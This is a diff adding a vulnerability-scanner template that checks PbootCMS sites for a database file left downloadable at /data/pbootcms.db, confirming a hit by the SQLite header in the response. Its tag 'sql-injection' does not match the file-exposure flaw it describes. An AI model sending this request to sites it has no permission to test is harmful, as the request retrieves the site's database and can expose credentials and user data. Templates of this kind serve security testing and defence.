@@ -1,0 +1,25 @@
+id: poc-yaml-pbootcms-database-file-download
+info:
+  name: Pbootcms Arbitrary Database File Download
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: sql-injection,pbootcms
+  description: |
+    PbootCMS arbitrary database file download vulnerability allows attackers to access the SQLite database file directly.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/data/pbootcms.db"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "^SQLite format 3\\x00\\x10"
+      - type: word
+        words:
+          - "PbootCMS"
+        part: body
